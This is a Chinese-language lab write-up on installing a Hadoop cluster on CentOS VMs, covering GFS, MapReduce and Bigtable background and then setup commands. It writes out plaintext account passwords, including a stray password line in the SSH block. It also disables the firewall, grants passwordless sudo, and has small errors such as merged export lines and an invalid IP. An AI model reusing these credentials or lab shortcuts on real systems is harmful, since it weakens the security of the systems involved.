    <content><![CDATA[<h1 id="Lab-1-Hadoop环境安装"><a href="#Lab-1-Hadoop环境安装" class="headerlink" title="Lab-1 Hadoop环境安装"></a>Lab-1 Hadoop环境安装</h1><h2 id="一、实验原理分析"><a href="#一、实验原理分析" class="headerlink" title="一、实验原理分析"></a>一、实验原理分析</h2><h3 id="Hadoop是什么"><a href="#Hadoop是什么" class="headerlink" title="Hadoop是什么"></a>Hadoop是什么</h3><p>Hadoop是一个由Apache基金会所发布的分布式系统基础架构，主要解决海量数据的存储和海量数据的分析计算问题，广义来说，Hadoop通常是指一个更广泛的概念——Hadoop生态圈。</p>
<p>Google是Hadoop的思想之源，GFS-&gt;HDFS，Map-Reduce-&gt;MR，Bigtable-&gt;HBase</p>
<h3 id="GFS（Google-File-System）"><a href="#GFS（Google-File-System）" class="headerlink" title="GFS（Google-File-System）"></a>GFS（Google-File-System）</h3><p>一个面向大规模数据密集型应用的、可伸缩的分布式文件系统。</p>
<ul>
<li>认为组件失效是一种常态，提供了容错机制，自动负载均衡，使得分布式文件系统可以在廉价机器上运行</li>
<li>面向大文件存储，文件通常在100MB或者以上，数个GB大小的文件也是普遍存在的</li>
<li>绝大部分文件的修改是采用在文件尾部追加数据，很少有随机写</li>
<li>应用程序和文件系统 API 的协同设计提高了整个系统的灵活性</li>
</ul>
<h4 id="架构"><a href="#架构" class="headerlink" title="架构"></a>架构</h4><p>一个 GFS 集群包含一个单独的 Master 节点、多台 Chunk 服务器，并且同时被多个客户端访问，如图 所示。</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112220046843.png" alt="img"></p>
<h3 id="Map-Reduce"><a href="#Map-Reduce" class="headerlink" title="Map-Reduce"></a>Map-Reduce</h3><p>总的来讲，Google MapReduce 所执行的分布式计算会以一组键值对作为输入，输出另一组键值对，用户则通过编写 Map 函数和 Reduce 函数来指定所要进行的计算。</p>
<p>由用户编写的Map 函数将被应用在每一个输入键值对上，并输出若干键值对作为中间结果。之后，MapReduce 框架则会将与同一个键$I$相关联的值都传递到同一次 Reduce 函数调用中。</p>
<p>同样由用户编写的 Reduce 函数以键$I$以及与该键相关联的值的集合作为参数，对传入的值进行合并并输出合并后的值的集合。</p>
<h4 id="Map-Reduce计算过程"><a href="#Map-Reduce计算过程" class="headerlink" title="Map-Reduce计算过程"></a>Map-Reduce计算过程</h4><p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112220046858.jpg" alt="preview"></p>
<p>首先，用户通过 MapReduce 客户端指定 Map 函数和 Reduce 函数，以及此次 MapReduce 计算的配置，包括中间结果键值对的 Partition 数量 $R$以及用于切分中间结果的哈希函数$hash$<br>用户开始 MapReduce 计算后，整个 MapReduce 计算的流程可总结如下：</p>
<ol>
<li>作为输入的文件会被分为$M$个 Split，每个 Split 的大小通常在 16~64 MB 之间</li>
<li>如此，整个 MapReduce 计算包含$M$个Map 任务和 $R$个 Reduce 任务。Master 结点会从空闲的 Worker 结点中进行选取并为其分配 Map 任务和 Reduce 任务</li>
<li>收到 Map 任务的 Worker 们（又称 Mapper）开始读入自己对应的 Split，将读入的内容解析为输入键值对并调用由用户定义的 Map 函数。由 Map 函数产生的中间结果键值对会被暂时存放在缓冲内存区中</li>
<li>在 Map 阶段进行的同时，Mapper 们周期性地将放置在缓冲区中的中间结果存入到自己的本地磁盘中，同时根据用户指定的 Partition 函数（默认为 $hash(key) mod R$ ）将产生的中间结果分为$R$ 个部分。任务完成时，Mapper 便会将中间结果在其本地磁盘上的存放位置报告给 Master</li>
<li>Mapper 上报的中间结果存放位置会被 Master 转发给 Reducer。当 Reducer 接收到这些信息后便会通过 RPC 读取存储在 Mapper 本地磁盘上属于对应 Partition 的中间结果。在读取完毕后，Reducer 会对读取到的数据进行排序以令拥有相同键的键值对能够连续分布</li>
<li>之后，Reducer 会为每个键收集与其关联的值的集合，并调用用户定义的 Reduce 函数。Reduce 函数的结果会被放入到对应的 Reduce Partition 结果文件</li>
</ol>
<p>实际上，在一个 MapReduce 集群中，Master 会记录每一个 Map 和 Reduce 任务的当前完成状态，以及所分配的 Worker。除此之外，Master 还负责将 Mapper 产生的中间结果文件的位置和大小转发给 Reducer。</p>
<p>值得注意的是，每次 MapReduce 任务执行时， $M$和$R$  的值都应比集群中的 Worker 数量要高得多，以达成集群内负载均衡的效果。</p>
<h3 id="Bigtable"><a href="#Bigtable" class="headerlink" title="Bigtable"></a>Bigtable</h3><h4 id="Bigtable是什么"><a href="#Bigtable是什么" class="headerlink" title="Bigtable是什么"></a>Bigtable是什么</h4><p>Bigtable是一个分布式的数据存储系统，用来管理那些被设计为可以横跨上万台机器，达海量级别的结构化数据。</p>
<p>一个Bigtable是一个稀疏的，分布式的，持久化的，多维度的有序Map。<br>这个Map通过行键（row key），列键（column key）和时间戳来进行索引：<br>(row:string, column:string, time:int64) → string</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112220046865.png" alt="Google论文之Bigtable详解-图1"></p>
<p>上面是一个用于存储海量网页的大表的结构，<br>以反转的URL作为row行名，以网页内容contents作为column列名，将网页中的锚点保存在anchor列簇中。<br>contents列有3个版本，分别是t3,t5,t6，通过timestamp字段来区分版本。</p>
<p>Bigtable不支持完整的关系数据模型，相反，它提供给客户端一种非常简单的数据模型，<br>能够支持动态的控制数据布局和数据格式（data layout and format），并且允许客户端推导出数据存储在底层具体位置。</p>
<p>具体的数据是通过行名（row name）和列名（column name）来进行索引的，行名和列名可以是任意的字符串。</p>
<p>客户端可以通过仔细设计的schemas来控制数据的所在位置，以达到是从内存还是磁盘获取数据。<br>并且大表Bigtable针对每行（row）的读写都是原子性的。</p>
<p>为了减轻管理许多不同版本数据的负担，客户端自定义设置保存最后n个或者n天内的数据版本。</p>
<h4 id="Bigtable核心概念"><a href="#Bigtable核心概念" class="headerlink" title="Bigtable核心概念"></a>Bigtable核心概念</h4><p><strong>column key 列键</strong></p>
<p>列键使用以下语法：列簇名:修饰符。比如上面的anchor:cnnsi.com就是一个列键，列簇名是anchor:，修饰符是cnnsi.com。</p>
<p><strong>column family 列簇</strong></p>
<p>列键组成在一起的集合称作列簇，是最基本的访问控制单元。<br>是将相似的一类信息放在一起，但是却分成多个列来存储，这样是为了高效的读取数据。</p>
<p>列簇必须先创建，才能在列簇下面的列中进行数据存取。 在找列簇之前也可以通过指定row keys进行寻址，这样可以更快的定位到数据，具有更佳的性能。</p>
<p>虽然一张大表支持的唯一名列簇的数量较少（最多只有数百），而且列簇在操作期间尽量少改变。 但是，我们可以无限拓展大表中的列数量。</p>
<p>访问控制和磁盘或内存的核算都在列簇级别进行。</p>
<p>客户端可以将多个列簇组合在一起，成为一个存储位置分组（locality group）。<br>针对每个tablet的存储位置分组会生成一个单独的SSTable。</p>
<p>之所以分开列簇，是为了防止寻找数据时被一起访问，从而更有效的进行数据读取。</p>
<p><strong>tablet 表块</strong></p>
<p>和传统关系数据库一样，一个表有很多行（row），由很多行组成的行范围（row range）就是一个tablet（这里翻译为表块），<br>比如第1000~1500行，就是一个tablet。表块是被动态划分的（但相邻的应该在一起），它是分发和负载均衡得基本单位。</p>
<h4 id="Bigtable具体实现"><a href="#Bigtable具体实现" class="headerlink" title="Bigtable具体实现"></a>Bigtable具体实现</h4><p>Bigtable主要由3个部分组成：</p>
<ul>
<li>每个客户端使用的lib</li>
<li>master服务器</li>
<li>多个tablet服务器</li>
</ul>
<p>master负责分配tablets给tablet服务器，并监控，探测tablet服务器的增加和失效，负责tablet的复杂均衡，对GFS上的文件进行垃圾回收。</p>
<p>master还处理表或者列簇的创建导致的schema的改变。</p>
<p>tablet服务器管理一系列的tablets，并负责处理它们的读写请求，以及当tablets太大时的切割操作。</p>
<p>一个Bigtable集群有许多的大表，每个大表包有一系列的tablets组成，每个tables由一定范围的rows组成。</p>
<h2 id="二、实验代码及命令分析"><a href="#二、实验代码及命令分析" class="headerlink" title="二、实验代码及命令分析"></a>二、实验代码及命令分析</h2><h3 id="准备一个模版虚拟机"><a href="#准备一个模版虚拟机" class="headerlink" title="准备一个模版虚拟机"></a>准备一个模版虚拟机</h3><p>用Parallels Desktop安装centos 7.5，设置静态 ip10.211.55.3，主机名为hadoop100</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">修改主机名</span></span><br><span class="line">[hmw@hadoop100 ~]$ vi /etc/hostname</span><br><span class="line">hadoop100</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">关闭防火墙</span></span><br><span class="line">[hmw@hadoop100 ~]$ systemctl stop firewalld</span><br><span class="line"></span><br><span class="line">[hmw@hadoop100 ~]$ systemctl disable firewalld.service</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">创建huang用户</span></span><br><span class="line">[hmw@hadoop100 ~]$ useradd huang</span><br><span class="line">[hmw@hadoop100 ~]$ passwd huang</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">root和hmw密码hmw，huang密码yc</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">配置hmw用户具有root权限</span></span><br><span class="line">[hmw@hadoop100 ~]$ vi /etc/sudoers</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">在%wheel  ALL=(ALL) ALL这行下面添加一行</span> </span><br><span class="line">huang ALL=(ALL) NOPASSWD:ALL</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">这一行不要直接放到 root 行下面，因为所有用户都属于 wheel 组，你先配置了huang具有免密功能，但是程序执行到%wheel行时，该功能又被覆盖回需要密码。所以huang要放到%wheel这行下面。</span></span><br><span class="line"></span><br><span class="line">[hmw@hadoop100 ~]$ mkdir /opt/module</span><br><span class="line">[hmw@hadoop100 ~]$ mkdir /opt/software</span><br><span class="line">[hmw@hadoop100 ~]$ chown huang:huang /opt/module</span><br><span class="line">[hmw@hadoop100 ~]$ chown huang:huang /opt/software</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">查看这两个文件的所有者和所有属组</span></span><br><span class="line">[hmw@hadoop100 ~]$ cd /opt</span><br><span class="line">[hmw@hadoop100 ~]$ ll</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">卸载虚拟机自带的JDK</span> </span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">rpm-qa:查询所安装的所有rpm软件包</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">grep -i:忽略大小写</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">xargs -n1:表示每次只传递一个参数</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">rpm -e –nodeps:强制卸载软件</span></span><br><span class="line">[hmw@hadoop100 ~]$ rpm -qa | grep -i java | xargs -n1 rpm -e --nodeps</span><br><span class="line"><span class="meta prompt_"> </span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">重启</span></span><br><span class="line">[hmw@hadoop100 ~]$ reboot</span><br></pre></td></tr></table></figure>

<h3 id="克隆虚拟机"><a href="#克隆虚拟机" class="headerlink" title="克隆虚拟机"></a>克隆虚拟机</h3><p>利用模版虚拟机克隆三台虚拟机 hadoop102(10.211.55.4) hadoop103(10.211.55.5) hadoop104(10.211.55.6)，克隆的时候先关闭虚拟机</p>
<h4 id="修改克隆机的主机名和hosts，已hadoop102为例"><a href="#修改克隆机的主机名和hosts，已hadoop102为例" class="headerlink" title="修改克隆机的主机名和hosts，已hadoop102为例"></a>修改克隆机的主机名和hosts，已hadoop102为例</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">修改hostname</span></span><br><span class="line">[huang@hadoop100 ~]$ vi /etc/hostname</span><br><span class="line">hadoop102</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">修改hosts</span></span><br><span class="line">[huang@hadoop100 ~]$ vi /etc/hosts</span><br><span class="line">10.211.55.3 hadoop100</span><br><span class="line">10.211.55.4 hadoop102</span><br><span class="line">10.211.55.5 hadoop103</span><br><span class="line">10.211.55.6 hadoop104</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">重启</span></span><br><span class="line">[huang@hadoop100 ~]$ reboot</span><br></pre></td></tr></table></figure>

<p>其他虚拟机以相同方式去修改</p>
<h4 id="修改主机Mac的hosts"><a href="#修改主机Mac的hosts" class="headerlink" title="修改主机Mac的hosts"></a>修改主机Mac的hosts</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">huangmingwang@huangmingwangdeMacBook-Pro ~ % vi /etc/hosts</span><br><span class="line">10.211.55.3 hadoop100</span><br><span class="line">10.211.55.4 hadoop102</span><br><span class="line">10.211.55.5 hadoop103</span><br><span class="line">10.211.55.6 hadoop104</span><br></pre></td></tr></table></figure>

<h3 id="在hadoop102安装JDK"><a href="#在hadoop102安装JDK" class="headerlink" title="在hadoop102安装JDK"></a>在hadoop102安装JDK</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">将mac中下载好的jdk导入到hadoop102虚拟机的/opt/software目录下</span></span><br><span class="line">huangmingwang@huangmingwangdeMacBook-Pro ~ % scp /Users/huangmingwang/Downloads/jdk-8u212-linux-x64.tar.gz huang@hadoop102:/opt/software/</span><br></pre></td></tr></table></figure>



<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">查看是否导入成功</span></span><br><span class="line">[huang@hadoop102 ~]$ cd /opt/software/</span><br><span class="line">[huang@hadoop102 software]$ ll</span><br><span class="line">总用量 190444</span><br><span class="line">-rw-rw-r--. 1 huang huang 195013152 6月  28 00:09 jdk-8u212-linux-x64.tar.gz</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">解压</span></span><br><span class="line">[huang@hadoop102 software]$ tar -zxvf jdk-8u212-linux-x64.tar.gz -C /opt/module/</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">配置JDK环境变量</span></span><br><span class="line">[huang@hadoop102 ~]$  sudo vi /etc/profile.d/my_env.sh</span><br><span class="line">export JAVA_HOME=/opt/module/jdk1.8.0_212</span><br><span class="line">export PATH=$PATH:$JAVA_HOME/bin</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">让新的环境变量生效</span></span><br><span class="line">[huang@hadoop102 ~]$ source /etc/profile</span><br><span class="line">[huang@hadoop102 ~]$ java -version</span><br><span class="line">java version &quot;1.8.0_212&quot;</span><br><span class="line">Java(TM) SE Runtime Environment (build 1.8.0_212-b10)</span><br><span class="line">Java HotSpot(TM) 64-Bit Server VM (build 25.212-b10, mixed mode)</span><br></pre></td></tr></table></figure>

<h3 id="在hadoop102安装Hadoop"><a href="#在hadoop102安装Hadoop" class="headerlink" title="在hadoop102安装Hadoop"></a>在hadoop102安装Hadoop</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">将mac中下载好的hadoop导入到hadoop102虚拟机的/opt/software目录下</span></span><br><span class="line">huangmingwang@huangmingwangdeMacBook-Pro ~ % scp /Users/huangmingwang/Downloads/hadoop-3.1.3.tar.gz huang@hadoop102:/opt/software/</span><br></pre></td></tr></table></figure>



<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">解压</span></span><br><span class="line">[huang@hadoop102 ~]$ cd /opt/software/</span><br><span class="line">[huang@hadoop102 software]$ tar -zxvf hadoop-3.1.3.tar.gz -C /opt/module/</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">配置环境变量</span></span><br><span class="line">[huang@hadoop102 software]$ cd /opt/module/hadoop-3.1.3/</span><br><span class="line">[huang@hadoop102 hadoop-3.1.3]$ pwd</span><br><span class="line">/opt/module/hadoop-3.1.3</span><br><span class="line"></span><br><span class="line">[huang@hadoop102 hadoop-3.1.3]$ sudo vi /etc/profile.d/my_env.sh </span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">HADOOP_HOME</span></span><br><span class="line">export HADOOP_HOME=/opt/module/hadoop-3.1.3 export PATH=$PATH:$HADOOP_HOME/bin</span><br><span class="line">export PATH=$PATH:$HADOOP_HOME/sbin</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">让配置文件生效</span></span><br><span class="line">[huang@hadoop102 hadoop-3.1.3]$ source /etc/profile</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">查看是否安装成功</span></span><br><span class="line">[huang@hadoop102 ~]$ hadoop version</span><br><span class="line">Hadoop 3.1.3</span><br><span class="line">Source code repository https://gitbox.apache.org/repos/asf/hadoop.git -r ba631c436b806728f8ec2f54ab1e289526c90579</span><br><span class="line">Compiled by ztang on 2019-09-12T02:47Z</span><br><span class="line">Compiled with protoc 2.5.0</span><br><span class="line">From source with checksum ec785077c385118ac91aadde5ec9799</span><br><span class="line">This command was run using /opt/module/hadoop-3.1.3/share/hadoop/common/hadoop-common-3.1.3.jar</span><br></pre></td></tr></table></figure>

<h3 id="Hadoop目录结构"><a href="#Hadoop目录结构" class="headerlink" title="Hadoop目录结构"></a>Hadoop目录结构</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[huang@hadoop102 hadoop-3.1.3]$ ll</span><br><span class="line">总用量 200</span><br><span class="line">drwxr-xr-x. 2 huang huang   4096 9月  12 2019 bin</span><br><span class="line">drwxr-xr-x. 3 huang huang   4096 9月  12 2019 etc</span><br><span class="line">drwxr-xr-x. 2 huang huang   4096 9月  12 2019 include</span><br><span class="line">drwxr-xr-x. 3 huang huang   4096 9月  12 2019 lib</span><br><span class="line">drwxr-xr-x. 4 huang huang   4096 9月  12 2019 libexec</span><br><span class="line">-rw-rw-r--. 1 huang huang 147145 9月   4 2019 LICENSE.txt</span><br><span class="line">-rw-rw-r--. 1 huang huang  21867 9月   4 2019 NOTICE.txt</span><br><span class="line">-rw-rw-r--. 1 huang huang   1366 9月   4 2019 README.txt</span><br><span class="line">drwxr-xr-x. 3 huang huang   4096 9月  12 2019 sbin</span><br><span class="line">drwxr-xr-x. 4 huang huang   4096 9月  12 2019 share</span><br></pre></td></tr></table></figure>

<ul>
<li>bin 目录:存放对 Hadoop 相关服务(hdfs，yarn，mapred)进行操作的脚本 </li>
<li>etc 目录:Hadoop 的配置文件目录，存放 Hadoop 的配置文件</li>
<li>lib 目录:存放 Hadoop 的本地库(对数据进行压缩解压缩功能)</li>
<li>sbin 目录:存放启动或停止 Hadoop 相关服务的脚本</li>
<li>share 目录:存放 Hadoop 的依赖 jar 包、文档、和官方案例</li>
</ul>
<h3 id="编写集群分发脚本"><a href="#编写集群分发脚本" class="headerlink" title="编写集群分发脚本"></a>编写集群分发脚本</h3><h4 id="rsync和scp的区别"><a href="#rsync和scp的区别" class="headerlink" title="rsync和scp的区别"></a>rsync和scp的区别</h4><p>rsync 主要用于备份和镜像。具有速度快、避免复制相同内容和支持符号链接的优点。</p>
<p>rsync 和 scp 区别:用 rsync 做文件的复制要比 scp 的速度快，rsync 只对差异文件做更</p>
<p>新。scp 是把所有文件都复制过去。</p>
<h4 id="编写xsync集群分发脚本"><a href="#编写xsync集群分发脚本" class="headerlink" title="编写xsync集群分发脚本"></a>编写xsync集群分发脚本</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[huang@hadoop102 ~]$ cd /home/huang/</span><br><span class="line">[huang@hadoop102 ~]$ mkdir bin</span><br><span class="line">[huang@hadoop102 ~]$ cd bin</span><br><span class="line">[huang@hadoop102 bin]$ vi xsync</span><br></pre></td></tr></table></figure>

<p>添加一下内容：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/bash</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">1. 判断参数个数</span> </span><br><span class="line">if [ $# -lt 1 ] </span><br><span class="line">then</span><br><span class="line">		echo Not Enough Arguement!</span><br><span class="line">		exit; </span><br><span class="line">fi</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">2. 遍历集群所有机器</span></span><br><span class="line">for host in hadoop102 hadoop103 hadoop104 </span><br><span class="line">do</span><br><span class="line">	echo ==================== $host ==================== </span><br><span class="line"><span class="meta prompt_">	#</span><span class="language-bash">3. 遍历所有目录，挨个发送</span></span><br><span class="line">  for file in $@</span><br><span class="line">  do</span><br><span class="line"><span class="meta prompt_">		#</span><span class="language-bash">4. 判断文件是否存在</span> </span><br><span class="line">		if [ -e $file ]</span><br><span class="line">		then</span><br><span class="line">				#5. 获取父目录</span><br><span class="line">				pdir=$(cd -P $(dirname $file); pwd)</span><br><span class="line">				#6. 获取当前文件的名称 </span><br><span class="line">				fname=$(basename $file)</span><br><span class="line">				ssh $host &quot;mkdir -p $pdir&quot;</span><br><span class="line">				rsync -av $pdir/$fname $host:$pdir</span><br><span class="line">    else</span><br><span class="line">        echo $file does not exists!</span><br><span class="line">		fi </span><br><span class="line">	done</span><br><span class="line">done</span><br></pre></td></tr></table></figure>

<h4 id="分发环境变量"><a href="#分发环境变量" class="headerlink" title="分发环境变量"></a>分发环境变量</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">修改脚本xsync具有执行权限</span></span><br><span class="line">[huang@hadoop102 bin]$ chmod +x xsync </span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">将脚本复制到/bin，以便全局调用</span></span><br><span class="line">[huang@hadoop102 bin]$ sudo cp xsync /bin/</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">如果用了sudo，那么xsync一定要给它的路径补全</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">同步环境变量配置（root所有者）</span></span><br><span class="line">[huang@hadoop102 ~]$ sudo ./bin/xsync /etc/profile.d/my_env.sh </span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">让环境变量生效</span></span><br><span class="line">[huang@hadoop102 ~]$ ssh huang@hadoop103</span><br><span class="line">[huang@hadoop103 ~]$ source /etc/profile</span><br><span class="line">[huang@hadoop103 ~]$ ssh huang@hadoop104</span><br><span class="line">[huang@hadoop104 ~]$ source /etc/profile</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="SSH无密码登陆配置"><a href="#SSH无密码登陆配置" class="headerlink" title="SSH无密码登陆配置"></a>SSH无密码登陆配置</h3><h4 id="免密码登陆原理"><a href="#免密码登陆原理" class="headerlink" title="免密码登陆原理"></a>免密码登陆原理</h4><p><strong>1.通常的ssh密码登陆过程</strong></p>
<ul>
<li>用户向所要登陆的远程主机发送登陆请求</li>
<li>远程主机收到用户的登录请求，把自己的公钥发送给用户</li>
<li>用户使用这个公钥，将登陆密码加密后，发送给远程主机</li>
<li>远程主机用自己的私钥，解密登陆密码，如果密码正确，就同意用户登陆</li>
</ul>
<p>在linux中，如果第一次通过ssh登陆远程主机，会出现以下提示：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[huang@hadoop102 ~]$ ssh huang@hadoop103</span><br><span class="line">The authenticity of host &#x27;hadoop103 (10.211.55.5)&#x27; can&#x27;t be established.</span><br><span class="line">ECDSA key fingerprint is SHA256:wsBGThjnNNKRLdb8nms49AJFfnTt6erg5jHj4bCXm40.</span><br><span class="line">ECDSA key fingerprint is MD5:93:ee:77:88:bc:7a:ed:0a:3d:d6:62:ce:95:38:be:05.</span><br><span class="line">Are you sure you want to continue connecting (yes/no)? yes</span><br></pre></td></tr></table></figure>

<p>这段话的意思是，无法确认host主机的真实性，公钥指纹和MD5可能会被中间人攻击替换，问你还想继续吗？</p>
<p>所谓的“公钥指纹”，是指公钥长度较长（这里采用RSA算法，长达1024位），很难比对，所以对其进行MD5计算，将他变成128位的指纹。上列中是93:ee:77:88:bc:7a:ed:0a:3d:d6:62:ce:95:38:be:05.再进行比较，就容易多了。</p>
<p>假定经过风险衡量以后，用户决定接受这个远程主机的公钥。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">Are you sure you want to continue connecting (yes/no)?yes</span><br></pre></td></tr></table></figure>

<p>系统会出现一句提示，表示host主机已经得到认可。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">Warning: Permanently added &#x27;host,12.18.429.21&#x27; (RSA) to the list of known hosts.</span><br></pre></td></tr></table></figure>

<p>然后，会要求输入密码。</p>
<p>如果密码正确，就可以登录了。</p>
<p>当远程主机的公钥被接受以后，它就会被保存在用户home目录的$HOME&#x2F;.ssh&#x2F;known_hosts文件之中。下次再连接这台远程主机，系统就会认出它的公钥已经保存在本地了，从而跳过警告部分，直接提示输入密码。</p>
<p>如果远程主机重新装过系统或因为别的原因，导致ssh指纹改变，需要把.ssh目录下的know_hosts文件中相应远程主机IP一致的指纹删除，再通过ssh登录一次回答yes，重新认证一次方可登录。注意.ssh是目录是以“.”开头的隐藏目录，需要#ls -a参数才能看到。而且这个目录的权限必须是700，并且用户的home目录也不能给其他用户写权限，否则ssh服务器会拒绝登录。如果发生不能登录的问题，可以查看服务器上的日志文件&#x2F;var&#x2F;log&#x2F;secure。</p>
<p><strong>2.公钥登陆（免密码登陆）</strong></p>
<p>A服务器想要无密码登陆B服务器的话，得把自己的公钥给B，B如果想让A无密码登陆就认可A的公钥，这样A的发送的指令不保密（因为公钥是公开的），但是B返回的结果只有A能解开</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112220046874.png" alt="image-20210628003617469"></p>
<h4 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">生成公钥和私钥</span></span><br><span class="line">[huang@hadoop102 ~]$ cd /home/huang/.ssh/</span><br><span class="line">[huang@hadoop102 .ssh]$ ssh-keygen -t rsa</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">按三下回车就会生成rsa文件</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">将公钥拷贝到要免密登陆的目标机器上</span></span><br><span class="line">[huang@hadoop102 .ssh]$ ssh-copy-id hadoop102</span><br><span class="line">[huang@hadoop102 .ssh]$ ssh-copy-id hadoop103</span><br><span class="line">[huang@hadoop102 .ssh]$ ssh-copy-id hadoop104</span><br><span class="line"></span><br><span class="line">ycbaby000623</span><br></pre></td></tr></table></figure>

<ul>
<li><p>还需要在 hadoop103 上采用 huang 账号配置一下无密登录到 hadoop102、hadoop103、 hadoop104 服务器上。</p>
</li>
<li><p>还需要在 hadoop104 上采用 huang 账号配置一下无密登录到 hadoop102、hadoop103、 hadoop104 服务器上。</p>
</li>
<li><p>还需要在 hadoop102 上采用 root 账号，配置一下无密登录到 hadoop102、hadoop103、 hadoop104;</p>
</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@hadoop102 .ssh]# ll</span><br><span class="line">总用量 16</span><br><span class="line">-rw-------. 1 root root  396 6月  28 00:51 authorized_keys</span><br><span class="line">-rw-------. 1 root root 1679 6月  28 00:50 id_rsa</span><br><span class="line">-rw-r--r--. 1 root root  396 6月  28 00:50 id_rsa.pub</span><br><span class="line">-rw-r--r--. 1 root root  549 6月  28 00:30 known_hosts</span><br></pre></td></tr></table></figure>

<ul>
<li>Known_hosts: 记录ssh访问过计算机的公钥（public key）</li>
<li>id_rsa: 生成的私钥</li>
<li>id_rsa.pub: 生成的公钥</li>
<li>authorized_keys: 存放授权过的无密码登录服务器公钥，授权过的服务器可以无密码访问本服务器</li>
</ul>
<h3 id="集群配置"><a href="#集群配置" class="headerlink" title="集群配置"></a>集群配置</h3><h4 id="集群规划"><a href="#集群规划" class="headerlink" title="集群规划"></a>集群规划</h4><ul>
<li>NameNode和SecondaryNameNode 不要安装在同一台服务器上</li>
<li>ResourceManage很消耗内存，最好不要和NameNode，SecondaryNameNode配置在同一台机器上</li>
</ul>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112220046885.png" alt="image-20210628012056622"></p>
<h4 id="配置文件说明"><a href="#配置文件说明" class="headerlink" title="配置文件说明"></a>配置文件说明</h4><p>Hadoop 配置文件分两类:默认配置文件和自定义配置文件，只有用户想修改某一默认</p>
<p>配置值时，才需要修改自定义配置文件，更改相应属性值。</p>
<h5 id="默认配置文件"><a href="#默认配置文件" class="headerlink" title="默认配置文件"></a>默认配置文件</h5><p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112220049179.png" alt="image-20210628012641270"></p>
<h5 id="自定义配置文件"><a href="#自定义配置文件" class="headerlink" title="自定义配置文件"></a>自定义配置文件</h5><p><strong>core-site.xml</strong>、<strong>hdfs-site.xml</strong>、<strong>yarn-site.xml</strong>、<strong>mapred-site.xml</strong> 四个配置文件存放在 $HADOOP_HOME&#x2F;etc&#x2F;hadoop 这个路径上，用户可以根据项目需求重新进行修改配置。</p>
